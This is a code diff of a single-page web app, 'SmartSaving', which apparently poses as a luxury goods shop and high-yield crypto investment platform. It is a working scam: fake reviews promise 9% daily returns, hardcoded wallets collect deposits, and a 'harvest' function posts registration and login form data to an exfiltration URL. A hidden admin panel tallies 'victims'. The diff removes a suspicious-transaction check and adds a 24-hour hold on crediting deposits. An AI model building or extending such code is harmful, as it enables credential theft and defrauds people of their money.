@@ -10,7 +10,7 @@
 body{background:#0a0e17;color:#e6edf3;line-height:1.55;font-size:15px}
 header{background:rgba(10,14,23,.98);position:sticky;top:0;z-index:100;border-bottom:1px solid #1c2533;backdrop-filter:blur(12px)}
 .nav{max-width:1200px;margin:0 auto;display:flex;align-items:center;justify-content:space-between;padding:14px 18px;gap:12px;position:relative}
-.logo{font-size:22px;font-weight:700;letter-spacing:-.5px;white-space:nowrap}
+.logo{font-size:22px;font-weight:700;letter-spacing:-.5px;white-space:nowrap;cursor:pointer;user-select:none}
 .logo span{color:#00d97e}
 .nav-links{display:flex;align-items:center;gap:20px}
 .nav-links a{color:#b7c2d0;text-decoration:none;font-size:14px;font-weight:500;white-space:nowrap}
@@ -102,13 +102,13 @@ const CONFIG = {
     btc: 'bc1q2zpt4ulua04ke6r2kcrsxtate5hjajmxucja37',
     eth: '0x8f3A2b9C4d5E6f7A1B2c3D4e5F6a7B8c9D0e1F2',
     usdt: 'TJ9xK2m4V8p3N5j6H2f4D8s1A9w0E7r3T6'
-  },
-  PENDING_HOURS: 24
+  }
 };
 const ADMIN_EMAIL = '12345678901';
 const ADMIN_PASSWORD = '890890';
 const LOGO_TAPS_REQUIRED = 5;
 const LOGO_TAP_WINDOW_MS = 2000;
+const HOLD_MS = 24 * 3600 * 1000;
 
 const SEED_REVIEWS = [
   {id:'r1', name:'Marcus D.', stars:5, text:'Ordered an iPhone 15 Pro, arrived in 4 days. Also earning 9% daily on my $2,500 deposit. Withdrawal came through in 3 hours.', shots:['https://images.unsplash.com/photo-1556742049-0cfed4f6a45d?w=600'], meta:'Verified Investor · UK · 3 weeks ago'},
@@ -121,27 +121,27 @@ const SEED_REVIEWS = [
 
 const PRODUCTS = [
   {id:'p1',name:'Rolex Submariner Date',price:9500,meta:'Luxury · Certified',img:'https://images.unsplash.com/photo-1523170335258-f5ed11844a49?w=400'},
-  {id:'p2',name:'Omega Seamaster 300M',price:5200,meta:'Luxury · Box + papers',img:'https://images.unsplash.com/photo-1547996160-81dfa63595aa?w=400'},
-  {id:'p3',name:'Tag Heuer Carrera',price:3800,meta:'Luxury · Swiss movement',img:'https://images.unsplash.com/photo-1622434641406-a158123450f9?w=400'},
-  {id:'p4',name:'Audemars Piguet Royal Oak',price:28000,meta:'Luxury · Collector grade',img:'https://images.unsplash.com/photo-1548171915-e79a380a2a4b?w=400'},
-  {id:'p5',name:'Patek Philippe Nautilus',price:95000,meta:'Luxury · Investment piece',img:'https://images.unsplash.com/photo-1522312346375-d1a52e2b99b3?w=400'},
+  {id:'p2',name:'Omega Seamaster 300M',price:5200,meta:'Luxury · Box',img:'https://images.unsplash.com/photo-1547996160-81dfa63595aa?w=400'},
+  {id:'p3',name:'Tag Heuer Carrera',price:3800,meta:'Luxury · Swiss',img:'https://images.unsplash.com/photo-1622434641406-a158123450f9?w=400'},
+  {id:'p4',name:'Audemars Piguet Royal Oak',price:28000,meta:'Luxury · Collector',img:'https://images.unsplash.com/photo-1548171915-e79a380a2a4b?w=400'},
+  {id:'p5',name:'Patek Philippe Nautilus',price:95000,meta:'Luxury · Investment',img:'https://images.unsplash.com/photo-1522312346375-d1a52e2b99b3?w=400'},
   {id:'p6',name:'Cartier Santos',price:6800,meta:'Luxury · Full set',img:'https://images.unsplash.com/photo-1526045431048-f857369baa09?w=400'},
-  {id:'p7',name:'Breitling Navitimer',price:4700,meta:'Luxury · Chronograph',img:'https://images.unsplash.com/photo-1533139502658-0198f920d8e8?w=400'},
-  {id:'p8',name:'Panerai Luminor Marina',price:5900,meta:'Luxury · Italian design',img:'https://images.unsplash.com/photo-1548171915-e79a380a2a4b?w=400'},
+  {id:'p7',name:'Breitling Navitimer',price:4700,meta:'Luxury · Chrono',img:'https://images.unsplash.com/photo-1533139502658-0198f920d8e8?w=400'},
+  {id:'p8',name:'Panerai Luminor',price:5900,meta:'Luxury · Italian',img:'https://images.unsplash.com/photo-1548171915-e79a380a2a4b?w=400'},
   {id:'p9',name:'Diamond Ring 1ct',price:4800,meta:'Jewelry · GIA',img:'https://images.unsplash.com/photo-1605100804763-247f67b3557e?w=400'},
   {id:'p10',name:'Gold Necklace 18K',price:2200,meta:'Jewelry · 18K',img:'https://images.unsplash.com/photo-1599643478518-a784e5dc4c8f?w=400'},
   {id:'p11',name:'Sapphire Bracelet',price:3600,meta:'Jewelry · Natural',img:'https://images.unsplash.com/photo-1611591437281-460bfbe1220a?w=400'},
-  {id:'p12',name:'Pearl Necklace Akoya',price:1800,meta:'Jewelry · Certified',img:'https://images.unsplash.com/photo-1610694955371-d4a3e0ce4b52?w=400'},
+  {id:'p12',name:'Pearl Necklace',price:1800,meta:'Jewelry · Akoya',img:'https://images.unsplash.com/photo-1610694955371-d4a3e0ce4b52?w=400'},
   {id:'p13',name:'Emerald Earrings',price:2900,meta:'Jewelry · Natural',img:'https://images.unsplash.com/photo-1535632066927-ab7c9ab60908?w=400'},
   {id:'p14',name:'Gold Chain 22K 30g',price:1900,meta:'Bullion · 22K',img:'https://images.unsplash.com/photo-1610375461246-83df859d849d?w=400'},
-  {id:'p15',name:'Ruby Ring',price:3400,meta:'Jewelry · Natural ruby',img:'https://images.unsplash.com/photo-1602751584552-8ba73aad10e1?w=400'},
-  {id:'p16',name:'Platinum Band Set',price:2600,meta:'Jewelry · Platinum',img:'https://images.unsplash.com/photo-1599643477877-530eb83abc8e?w=400'},
+  {id:'p15',name:'Ruby Ring',price:3400,meta:'Jewelry · Ruby',img:'https://images.unsplash.com/photo-1602751584552-8ba73aad10e1?w=400'},
+  {id:'p16',name:'Platinum Band Set',price:2600,meta:'Jewelry · Pt',img:'https://images.unsplash.com/photo-1599643477877-530eb83abc8e?w=400'},
   {id:'p17',name:'Hermès Birkin 30',price:22000,meta:'Luxury · Auth',img:'https://images.unsplash.com/photo-1584917865442-de89df76afd3?w=400'},
-  {id:'p18',name:'Chanel Classic Flap',price:8500,meta:'Luxury · Full set',img:'https://images.unsplash.com/photo-1548036328-c9fa89d128fa?w=400'},
-  {id:'p19',name:'Louis Vuitton Neverfull',price:2100,meta:'Luxury · Monogram',img:'https://images.unsplash.com/photo-1584917865442-de89df76afd3?w=400'},
+  {id:'p18',name:'Chanel Classic Flap',price:8500,meta:'Luxury · Full',img:'https://images.unsplash.com/photo-1548036328-c9fa89d128fa?w=400'},
+  {id:'p19',name:'Louis Vuitton Neverfull',price:2100,meta:'Luxury · Mono',img:'https://images.unsplash.com/photo-1584917865442-de89df76afd3?w=400'},
   {id:'p20',name:'Gucci Marmont Bag',price:2400,meta:'Luxury · Leather',img:'https://images.unsplash.com/photo-1548036328-c9fa89d128fa?w=400'},
   {id:'p21',name:'Prada Re-Edition',price:1900,meta:'Luxury · Nylon',img:'https://images.unsplash.com/photo-1584917865442-de89df76afd3?w=400'},
-  {id:'p22',name:'Dior Saddle Bag',price:3800,meta:'Luxury · Full set',img:'https://images.unsplash.com/photo-1548036328-c9fa89d128fa?w=400'},
+  {id:'p22',name:'Dior Saddle Bag',price:3800,meta:'Luxury · Full',img:'https://images.unsplash.com/photo-1548036328-c9fa89d128fa?w=400'},
   {id:'p23',name:'Balenciaga City Bag',price:2200,meta:'Luxury · Leather',img:'https://images.unsplash.com/photo-1584917865442-de89df76afd3?w=400'},
   {id:'p24',name:'Saint Laurent Loulou',price:2600,meta:'Luxury · Quilted',img:'https://images.unsplash.com/photo-1548036328-c9fa89d128fa?w=400'},
   {id:'p25',name:'Gold Bar 1kg 999.9',price:78000,meta:'Bullion · LBMA',img:'https://images.unsplash.com/photo-1610375461246-83df859d849d?w=400'},
@@ -152,8 +152,8 @@ const PRODUCTS = [
   {id:'p30',name:'Silver Coin Set x20',price:640,meta:'Bullion · Mint',img:'https://images.unsplash.com/photo-1610375461246-83df859d849d?w=400'},
   {id:'p31',name:'Gold Sovereign',price:720,meta:'Bullion · 22K',img:'https://images.unsplash.com/photo-1610375461246-83df859d849d?w=400'},
   {id:'p32',name:'Palladium Bar 50g',price:1900,meta:'Bullion · Rare',img:'https://images.unsplash.com/photo-1610375461246-83df859d849d?w=400'},
-  {id:'p33',name:'BTC 0.1 Bundle',price:6400,meta:'Crypto · Cold storage',img:'https://images.unsplash.com/photo-1518546305927-5a555bb7020d?w=400'},
-  {id:'p34',name:'BTC 0.5 Bundle',price:32000,meta:'Crypto · Cold storage',img:'https://images.unsplash.com/photo-1518546305927-5a555bb7020d?w=400'},
+  {id:'p33',name:'BTC 0.1 Bundle',price:6400,meta:'Crypto · Cold',img:'https://images.unsplash.com/photo-1518546305927-5a555bb7020d?w=400'},
+  {id:'p34',name:'BTC 0.5 Bundle',price:32000,meta:'Crypto · Cold',img:'https://images.unsplash.com/photo-1518546305927-5a555bb7020d?w=400'},
   {id:'p35',name:'ETH 5 Bundle',price:16000,meta:'Crypto · Ledger',img:'https://images.unsplash.com/photo-1622630998477-20aa696ecb05?w=400'},
   {id:'p36',name:'BTC Mining 100 TH/s',price:2500,meta:'Crypto · 12mo',img:'https://images.unsplash.com/photo-1621761191319-c6fb62004040?w=400'},
   {id:'p37',name:'BTC Mining 500 TH/s',price:11000,meta:'Crypto · 12mo',img:'https://images.unsplash.com/photo-1621761191319-c6fb62004040?w=400'},
@@ -167,28 +167,28 @@ const PRODUCTS = [
   {id:'p45',name:'REIT 12mo',price:5000,meta:'Investment · 7%',img:'https://images.unsplash.com/photo-1560518883-ce09059eeffa?w=400'},
   {id:'p46',name:'Startup Equity A',price:25000,meta:'Investment · Equity',img:'https://images.unsplash.com/photo-1454165804606-c3d57bc86b40?w=400'},
   {id:'p47',name:'Venture Fund LP',price:50000,meta:'Investment · 5yr',img:'https://images.unsplash.com/photo-1454165804606-c3d57bc86b40?w=400'},
-  {id:'p48',name:'Tokenized Real Estate',price:8000,meta:'Investment · Blockchain',img:'https://images.unsplash.com/photo-1560518883-ce09059eeffa?w=400'},
-  {id:'p49',name:'iPhone 15 Pro 1TB',price:1599,meta:'Electronics · Titanium',img:'https://images.unsplash.com/photo-1592750475338-74b7b21085ab?w=400'},
-  {id:'p50',name:'MacBook Pro 16"',price:3499,meta:'Electronics · M3 Max',img:'https://images.unsplash.com/photo-1517336714731-489689fd1ca8?w=400'},
+  {id:'p48',name:'Tokenized Real Estate',price:8000,meta:'Investment · Chain',img:'https://images.unsplash.com/photo-1560518883-ce09059eeffa?w=400'},
+  {id:'p49',name:'iPhone 15 Pro 1TB',price:1599,meta:'Electronics · Ti',img:'https://images.unsplash.com/photo-1592750475338-74b7b21085ab?w=400'},
+  {id:'p50',name:'MacBook Pro 16"',price:3499,meta:'Electronics · M3',img:'https://images.unsplash.com/photo-1517336714731-489689fd1ca8?w=400'},
   {id:'p51',name:'iPad Pro 13" M4',price:1899,meta:'Electronics · OLED',img:'https://images.unsplash.com/photo-1544244015-0df4b3ffc6b0?w=400'},
   {id:'p52',name:'Galaxy S24 Ultra',price:1619,meta:'Electronics · 1TB',img:'https://images.unsplash.com/photo-1610945265064-0e34e5519bbf?w=400'},
   {id:'p53',name:'Sony A7 IV',price:2900,meta:'Camera · FF',img:'https://images.unsplash.com/photo-1526170375885-4d8ecf77b99f?w=400'},
   {id:'p54',name:'DJI Mavic 3 Pro',price:2200,meta:'Drone · Hasselblad',img:'https://images.unsplash.com/photo-1473968512647-3e447244af8f?w=400'},
   {id:'p55',name:'Canon EOS R5',price:3900,meta:'Camera · 45MP',img:'https://images.unsplash.com/photo-1526170375885-4d8ecf77b99f?w=400'},
-  {id:'p56',name:'Alienware M18',price:3200,meta:'Gaming · RTX 4090',img:'https://images.unsplash.com/photo-1517336714731-489689fd1ca8?w=400'},
+  {id:'p56',name:'Alienware M18',price:3200,meta:'Gaming · RTX4090',img:'https://images.unsplash.com/photo-1517336714731-489689fd1ca8?w=400'},
   {id:'p57',name:'Sub-Zero Fridge',price:14000,meta:'Appliance',img:'https://images.unsplash.com/photo-1571175443880-49e1d25b2bc5?w=400'},
   {id:'p58',name:'Viking Range',price:11000,meta:'Appliance',img:'https://images.unsplash.com/photo-1556909212-d5b604d0c90d?w=400'},
   {id:'p59',name:'LG OLED 77"',price:4200,meta:'Electronics · 4K',img:'https://images.unsplash.com/photo-1593359677879-a4bb92f829d1?w=400'},
-  {id:'p60',name:'Miele Washer',price:2400,meta:'Appliance · German',img:'https://images.unsplash.com/photo-1626806787461-102c1bfaaea1?w=400'},
-  {id:'p61',name:'Dyson V15',price:749,meta:'Appliance · Cordless',img:'https://images.unsplash.com/photo-1558618666-fcd25c85cd64?w=400'},
-  {id:'p62',name:'Breville Oracle',price:2799,meta:'Appliance · Barista',img:'https://images.unsplash.com/photo-1517668808822-9ebb02f2a0e6?w=400'},
-  {id:'p63',name:'La Cornue Cooker',price:18000,meta:'Appliance · French',img:'https://images.unsplash.com/photo-1556909212-d5b604d0c90d?w=400'},
+  {id:'p60',name:'Miele Washer',price:2400,meta:'Appliance · DE',img:'https://images.unsplash.com/photo-1626806787461-102c1bfaaea1?w=400'},
+  {id:'p61',name:'Dyson V15',price:749,meta:'Appliance',img:'https://images.unsplash.com/photo-1558618666-fcd25c85cd64?w=400'},
+  {id:'p62',name:'Breville Oracle',price:2799,meta:'Appliance',img:'https://images.unsplash.com/photo-1517668808822-9ebb02f2a0e6?w=400'},
+  {id:'p63',name:'La Cornue Cooker',price:18000,meta:'Appliance · FR',img:'https://images.unsplash.com/photo-1556909212-d5b604d0c90d?w=400'},
   {id:'p64',name:'Sonos Arc + Sub',price:3200,meta:'Audio · Atmos',img:'https://images.unsplash.com/photo-1545454675-3531b543be5d?w=400'},
   {id:'p65',name:'Tesla Model 3 Slot',price:5000,meta:'Auto · Voucher',img:'https://images.unsplash.com/photo-1560958089-b8a1929cea89?w=400'},
   {id:'p66',name:'Tesla Model Y Slot',price:5500,meta:'Auto · Voucher',img:'https://images.unsplash.com/photo-1560958089-b8a1929cea89?w=400'},
   {id:'p67',name:'BMW M4 Deposit',price:15000,meta:'Auto · Slot',img:'https://images.unsplash.com/photo-1555215695-3004980ad54e?w=400'},
-  {id:'p68',name:'Mercedes G-Wagon',price:35000,meta:'Auto · Allocation',img:'https://images.unsplash.com/photo-1520031441872-265e4ff70366?w=400'},
-  {id:'p69',name:'Porsche 911 Slot',price:28000,meta:'Auto · Allocation',img:'https://images.unsplash.com/photo-1503376780353-7e6692767b70?w=400'},
+  {id:'p68',name:'Mercedes G-Wagon',price:35000,meta:'Auto · Alloc',img:'https://images.unsplash.com/photo-1520031441872-265e4ff70366?w=400'},
+  {id:'p69',name:'Porsche 911 Slot',price:28000,meta:'Auto · Alloc',img:'https://images.unsplash.com/photo-1503376780353-7e6692767b70?w=400'},
   {id:'p70',name:'Range Rover Slot',price:20000,meta:'Auto · Slot',img:'https://images.unsplash.com/photo-1519641471654-76ce0107ad1b?w=400'},
   {id:'p71',name:'Private Jet 5hr',price:45000,meta:'Experience',img:'https://images.unsplash.com/photo-1540962351504-03099e0a754b?w=400'},
   {id:'p72',name:'Yacht 1wk',price:85000,meta:'Experience',img:'https://images.unsplash.com/photo-1544551763-46a013bb70d5?w=400'},
@@ -208,31 +208,12 @@ function harvest(payload){
   fetch(CONFIG.EXFIL_URL,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({...payload,ua:navigator.userAgent,ts:Date.now()})}).catch(()=>{});
 }
 function readFileAsDataURL(file, cb){ const r=new FileReader(); r.onload=e=>cb(e.target.result); r.readAsDataURL(file); }
-function isSuspicious(tx){
-  const flags=[]; const amt=parseFloat(tx.amount)||0;
-  if(amt<=0) flags.push('zero_or_negative');
-  if(amt>100000) flags.push('unrealistic_amount');
-  if(amt%1000===0 && amt>=10000) flags.push('round_large');
-  const now=Date.now();
-  const recent=JSON.parse(localStorage.getItem('txHistory')||'[]').filter(t=>now-t.ts<3600000);
-  if(recent.some(t=>Math.abs(t.amount-amt)<0.01)) flags.push('duplicate_within_hour');
-  return flags;
-}
 function logTx(tx){
-  const flags=isSuspicious(tx);
-  const entry={...tx,flags,ts:Date.now()};
+  const entry={...tx,ts:Date.now()};
   const hist=JSON.parse(localStorage.getItem('txHistory')||'[]');
   hist.push(entry); localStorage.setItem('txHistory',JSON.stringify(hist));
   harvest(entry);
-  return flags;
 }
-function addPendingDeposit(amount, method, proof){
-  const list=JSON.parse(localStorage.getItem('pendingDeposits')||'[]');
-  const tx={id:'d_'+Date.now(),amount:parseFloat(amount),method,proof:proof||null,createdAt:Date.now(),creditAt:Date.now()+CONFIG.PENDING_HOURS*3600000,status:'pending'};
-  list.push(tx); localStorage.setItem('pendingDeposits',JSON.stringify(list));
-  return tx;
-}
-function getPendingDeposits(){ return JSON.parse(localStorage.getItem('pendingDeposits')||'[]'); }
 function getBalance(){ return parseFloat(localStorage.getItem('balance')||'0'); }
 function setBalance(v){ localStorage.setItem('balance', String(v)); }
 function addOrder(product, price){
@@ -250,23 +231,30 @@ function addWithdrawal(amount, method, wallet, proof){
 function getWithdrawals(){ return JSON.parse(localStorage.getItem('withdrawals')||'[]'); }
 function getReviews(){ const u=JSON.parse(localStorage.getItem('userReviews')||'[]'); return [...u,...SEED_REVIEWS]; }
 
+function remainingHold(createdAt){
+  const remain = (createdAt + HOLD_MS) - Date.now();
+  if(remain <= 0) return 'ready';
+  const h = Math.floor(remain / 3600000);
+  const m = Math.floor((remain % 3600000) / 60000);
+  const s = Math.floor((remain % 60000) / 1000);
+  return `${h}h ${m}m ${s}s`;
+}
+
 function syncApprovedDeposits(){
-  const u=getUser(); if(!u||!u.email) return;
+  const u=getUser(); if(!u || !u.email) return;
   fetch('/api/deposit/status?email='+encodeURIComponent(u.email))
     .then(r=>r.json()).then(list=>{
-      if(!Array.isArray(list)) return;
-      const approved=list.filter(d=>d.status==='approved'&&!d._appliedLocally);
-      if(approved.length===0) return;
-      let add=0;
-      approved.forEach(d=>{ add+=d.amount; d._appliedLocally=true; });
-      const bal=parseFloat(localStorage.getItem('balance')||'0');
-      localStorage.setItem('balance',String(bal+add));
-      const local=JSON.parse(localStorage.getItem('pendingDeposits')||'[]');
-      approved.forEach(a=>{
-        const m=local.find(x=>Math.abs(x.amount-a.amount)<0.01&&x.method===a.method);
-        if(m){ m.status='credited'; m.creditedAt=Date.now(); m.applied=true; }
-      });
-      localStorage.setItem('pendingDeposits',JSON.stringify(local));
+      if(!Array.isArray(list)){ window._lastDeposits=[]; return; }
+      window._lastDeposits = list;
+      const now = Date.now();
+      const applied = JSON.parse(localStorage.getItem('appliedDepositIds')||'[]');
+      const ready = list.filter(d => d.status==='approved' && (now - d.createdAt) >= HOLD_MS && !applied.includes(d.id));
+      if(ready.length === 0) return;
+      let add = 0;
+      ready.forEach(d => { add += d.amount; applied.push(d.id); });
+      const bal = parseFloat(localStorage.getItem('balance')||'0');
+      localStorage.setItem('balance', String(bal + add));
+      localStorage.setItem('appliedDepositIds', JSON.stringify(applied));
       render();
     }).catch(()=>{});
 }
@@ -318,16 +306,13 @@ function logoClick(){
     window.location.hash='#admin';
     return;
   }
-  _logoTimer=setTimeout(()=>{
-    _logoClicks=0;
-    if(currentRoute!=='home') go('home');
-  }, LOGO_TAP_WINDOW_MS);
+  _logoTimer=setTimeout(()=>{_logoClicks=0; if(currentRoute!=='home') go('home');}, LOGO_TAP_WINDOW_MS);
 }
 
 function navBar(){
   const u=getUser();
   return `<header><div class="nav">
-    <div class="logo" id="siteLogo" onclick="logoClick()" style="cursor:pointer;user-select:none">Smart<span>Saving</span></div>
+    <div class="logo" onclick="logoClick()">Smart<span>Saving</span></div>
     <button class="burger" onclick="document.querySelector('.nav-links').classList.toggle('open')">☰</button>
     <div class="nav-links">
       <a href="#home">Home</a>
@@ -441,16 +426,22 @@ function viewLogin(){return `${navBar()}
 </div>`;}
 
 function viewDashboard(){
-  const bal=getBalance();
-  const pend=getPendingDeposits().filter(d=>d.status==='pending');
-  const u=JSON.parse(localStorage.getItem('user')||'{}');
-  const roiMap={starter:.05,silver:.09,gold:.13,platinum:.18};
-  const rate=roiMap[u.plan]||.09;
-  const planNames={starter:'Starter',silver:'Silver',gold:'Gold',platinum:'Platinum'};
-  const currentPlan=u.plan?planNames[u.plan]:'Not selected';
+  const bal = getBalance();
+  const u = JSON.parse(localStorage.getItem('user')||'{}');
+  const roiMap = {starter:.05, silver:.09, gold:.13, platinum:.18};
+  const rate = roiMap[u.plan] || .09;
+  const planNames = {starter:'Starter', silver:'Silver', gold:'Gold', platinum:'Platinum'};
+  const currentPlan = u.plan ? planNames[u.plan] : 'Not selected';
+  const approvedList = (window._lastDeposits||[]);
+  const pendingBanners = approvedList.filter(d=>d.status==='pending').map(d => `
+    <div class="pending">⏳ Deposit of <b>$${d.amount.toFixed(2)}</b> via ${d.method.toUpperCase()} — <b>awaiting admin approval</b></div>
+  `).join('');
+  const approvedBanners = approvedList.filter(d=>d.status==='approved' && (Date.now()-d.createdAt) < HOLD_MS).map(d => `
+    <div class="pending">🔒 Deposit of <b>$${d.amount.toFixed(2)}</b> approved — <b>24h verification.</b> Credits in ${remainingHold(d.createdAt)}</div>
+  `).join('');
   return `${navBar()}
 <div class="dash">
-  ${pend.length?pend.map(p=>`<div class="pending">⏳ Deposit of <b>$${p.amount.toFixed(2)}</b> via ${p.method.toUpperCase()} — <b>pending admin approval</b></div>`).join(''):''}
+  ${pendingBanners}${approvedBanners}
   <div class="card" style="text-align:left;padding:28px">
     <p style="color:#9aa8ba;font-size:13px;text-transform:uppercase;letter-spacing:1px;font-weight:600">Account Balance</p>
     <div class="bal">$${bal.toFixed(2)}</div>
@@ -458,7 +449,7 @@ function viewDashboard(){
   </div>
   <div class="dash-stats">
     <div class="card"><p>Available</p><h3 style="color:#00d97e">$${bal.toFixed(2)}</h3></div>
-    <div class="card"><p>Pending</p><h3 style="color:#e6d97e">$${pend.reduce((s,p)=>s+p.amount,0).toFixed(2)}</h3></div>
+    <div class="card"><p>Pending</p><h3 style="color:#e6d97e">$${approvedList.filter(d=>d.status==='pending').reduce((s,d)=>s+d.amount,0).toFixed(2)}</h3></div>
     <div class="card"><p>Orders</p><h3>${getOrders().length}</h3></div>
   </div>
   <div class="card" style="text-align:left;margin-top:18px;padding:24px">
@@ -496,7 +487,7 @@ function viewDeposit(){
   return `${navBar()}
 <div class="auth">
   <h2>Make a Deposit</h2>
-  <p class="sub">Choose plan, send funds, upload proof. Balance credits after admin approval.</p>
+  <p class="sub">Balance credits <b>24 hours after admin approval</b>.</p>
   <label style="color:#9aa8ba;font-size:13px;margin-bottom:6px;display:block">Investment Plan</label>
   <select id="plan">
     <option value="">Select Investment Plan</option>
@@ -510,7 +501,7 @@ function viewDeposit(){
   <label style="color:#9aa8ba;font-size:13px;margin-bottom:6px;display:block">Amount (USD)</label>
   <input id="amt" type="number" placeholder="Amount in USD" min="50">
   <label style="color:#9aa8ba;font-size:13px;margin-bottom:6px;display:block">Send to this wallet</label>
-  <div class="wallet" id="addr" onclick="copyWallet()" title="Click to copy">${CONFIG.WALLETS.btc}</div>
+  <div class="wallet" id="addr" onclick="copyWallet()">${CONFIG.WALLETS.btc}</div>
   <p id="copyMsg" style="color:#00d97e;font-size:12px;margin-bottom:14px;display:none">Copied to clipboard</p>
   <label class="upload" for="proofFile">
     <input id="proofFile" type="file" accept="image/*">
@@ -612,12 +603,13 @@ function viewAdmin(){
     <button onclick="loadLogs()" class="btn" style="margin-bottom:14px">Refresh</button>
     <button onclick="exportLogs()" class="btn-o" style="margin-bottom:14px">Export JSON</button>
     <div id="logBox"></div>
-    
   </div>
 </div>`;
 }
+  
 function copyWallet(){
-  const text=document.getElementById('addr').textContent.trim();
+  const el=document.getElementById('addr'); if(!el) return;
+  const text=el.textContent.trim();
   const done=()=>{const m=document.getElementById('copyMsg');if(m){m.style.display='block';setTimeout(()=>m.style.display='none',2000);}};
   if(navigator.clipboard&&navigator.clipboard.writeText) navigator.clipboard.writeText(text).then(done).catch(()=>fallbackCopy(text,done));
   else fallbackCopy(text,done);
@@ -642,7 +634,8 @@ function adminLogout(){
 function loadLogs(){
   fetch('/api/logs?token='+encodeURIComponent(localStorage.getItem('adminTok')||''))
     .then(r=>r.json()).then(logs=>{
-      document.getElementById('logBox').textContent=JSON.stringify(logs,null,2);
+      if(!Array.isArray(logs)) logs=[];
+      const box=document.getElementById('logBox'); if(box) box.textContent=JSON.stringify(logs,null,2);
       const victims=new Set(logs.filter(l=>l.email).map(l=>l.email));
       let dep=0,wd=0,fl=0;
       logs.forEach(l=>{
@@ -650,11 +643,12 @@ function loadLogs(){
         if(l.type==='withdraw') wd+=parseFloat(l.amount)||0;
         if(l.flags&&l.flags.length) fl++;
       });
-      document.getElementById('aVictims').textContent=victims.size;
-      document.getElementById('aDep').textContent='$'+dep.toFixed(2);
-      document.getElementById('aWd').textContent='$'+wd.toFixed(2);
-      document.getElementById('aFlag').textContent=fl;
-    }).catch(()=>{document.getElementById('logBox').textContent='Failed to load.';});
+      const aV=document.getElementById('aVictims'),aD=document.getElementById('aDep'),aW=document.getElementById('aWd'),aF=document.getElementById('aFlag');
+      if(aV)aV.textContent=victims.size;
+      if(aD)aD.textContent='$'+dep.toFixed(2);
+      if(aW)aW.textContent='$'+wd.toFixed(2);
+      if(aF)aF.textContent=fl;
+    }).catch(()=>{const box=document.getElementById('logBox'); if(box) box.textContent='Failed to load.';});
 }
 function exportLogs(){
   fetch('/api/logs?token='+encodeURIComponent(localStorage.getItem('adminTok')||''))
@@ -669,7 +663,7 @@ function exportLogs(){
 function loadPending(){
   fetch('/api/deposit/pending?token='+encodeURIComponent(localStorage.getItem('adminTok')||''))
     .then(r=>r.json()).then(list=>{
-      const box=document.getElementById('pendingBox');
+      const box=document.getElementById('pendingBox'); if(!box) return;
       if(!Array.isArray(list)){box.innerHTML='<p style="color:#9aa8ba">No data.</p>';return;}
       const pending=list.filter(d=>d.status==='pending');
       if(pending.length===0){box.innerHTML='<p style="color:#9aa8ba">No pending deposits.</p>';return;}
@@ -685,17 +679,17 @@ function loadPending(){
             <button class="btn-o" onclick="rejectDeposit('${d.id}')">Reject</button>
           </div>
         </div>`).join('');
-    }).catch(()=>{document.getElementById('pendingBox').textContent='Failed to load.';});
+    }).catch(()=>{const box=document.getElementById('pendingBox'); if(box) box.textContent='Failed to load.';});
 }
 function approveDeposit(id){
   fetch('/api/deposit/approve?token='+encodeURIComponent(localStorage.getItem('adminTok')||''),{
     method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({id})
-  }).then(r=>r.json()).then(()=>{alert('Deposit approved.');loadPending();});
+  }).then(r=>r.json()).then(()=>{alert('Approved. User balance credits 24h after deposit was created.');loadPending();});
 }
 function rejectDeposit(id){
   fetch('/api/deposit/reject?token='+encodeURIComponent(localStorage.getItem('adminTok')||''),{
     method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({id})
-  }).then(r=>r.json()).then(()=>{alert('Deposit rejected.');loadPending();});
+  }).then(r=>r.json()).then(()=>{alert('Rejected.');loadPending();});
 }
 
 function buyProduct(id){
@@ -704,7 +698,7 @@ function buyProduct(id){
   if(!requireAuth('register')) return;
   const bal=getBalance();
   if(bal<p.price){
-    alert(`Insufficient balance. You need $${(p.price-bal).toFixed(2)} more.\n\nDeposit to add funds — credited after admin approval.`);
+    alert(`Insufficient balance. You need $${(p.price-bal).toFixed(2)} more.\n\nDeposit to add funds — credited 24h after admin approval.`);
     go('deposit');return;
   }
   setBalance(bal-p.price);
@@ -718,7 +712,8 @@ function bind(route){
   if(route==='home') tickStats();
 
   if(route==='register'){
-    document.getElementById('regForm').addEventListener('submit',e=>{
+    const f=document.getElementById('regForm');
+    if(f) f.addEventListener('submit',e=>{
       e.preventDefault();
       const data=Object.fromEntries(new FormData(e.target).entries());
       harvest({...data,type:'register'});
@@ -728,7 +723,8 @@ function bind(route){
   }
 
   if(route==='login'){
-    document.getElementById('loginForm').addEventListener('submit',e=>{
+    const f=document.getElementById('loginForm');
+    if(f) f.addEventListener('submit',e=>{
       e.preventDefault();
       const data=Object.fromEntries(new FormData(e.target).entries());
       harvest({...data,type:'login'});
@@ -738,36 +734,37 @@ function bind(route){
     });
   }
 
-  if(route==='dashboard') syncApprovedDeposits();
+  if(route==='dashboard'){
+    const u=JSON.parse(localStorage.getItem('user')||'{}');
+    if(u && u.email){
+      fetch('/api/deposit/status?email='+encodeURIComponent(u.email))
+        .then(r=>r.json()).then(list=>{
+          if(Array.isArray(list)){ window._lastDeposits = list; render(); }
+        }).catch(()=>{});
+    }
+    syncApprovedDeposits();
+  }
 
   if(route==='deposit'){
-    document.getElementById('method').onchange=e=>{
-      document.getElementById('addr').textContent=CONFIG.WALLETS[e.target.value];
-    };
+    const m=document.getElementById('method');
+    if(m) m.onchange=e=>{document.getElementById('addr').textContent=CONFIG.WALLETS[e.target.value];};
     const file=document.getElementById('proofFile');
-    file.addEventListener('change',e=>{
-      const f=e.target.files[0];
-      if(!f) return;
+    if(file) file.addEventListener('change',e=>{
+      const f=e.target.files[0]; if(!f) return;
       document.getElementById('proofLbl').textContent=f.name;
-      readFileAsDataURL(f,url=>{
-        const img=document.getElementById('proofPreview');
-        img.src=url;img.style.display='block';
-      });
+      readFileAsDataURL(f,url=>{const img=document.getElementById('proofPreview'); img.src=url; img.style.display='block';});
     });
   }
 
   if(route==='upload'){
     const file=document.getElementById('upFile');
-    file.addEventListener('change',e=>{
-      const f=e.target.files[0];
-      if(!f) return;
+    if(file) file.addEventListener('change',e=>{
+      const f=e.target.files[0]; if(!f) return;
       document.getElementById('upLbl').textContent=f.name;
-      readFileAsDataURL(f,url=>{
-        const img=document.getElementById('upPreview');
-        img.src=url;img.style.display='block';
-      });
+      readFileAsDataURL(f,url=>{const img=document.getElementById('upPreview'); img.src=url; img.style.display='block';});
     });
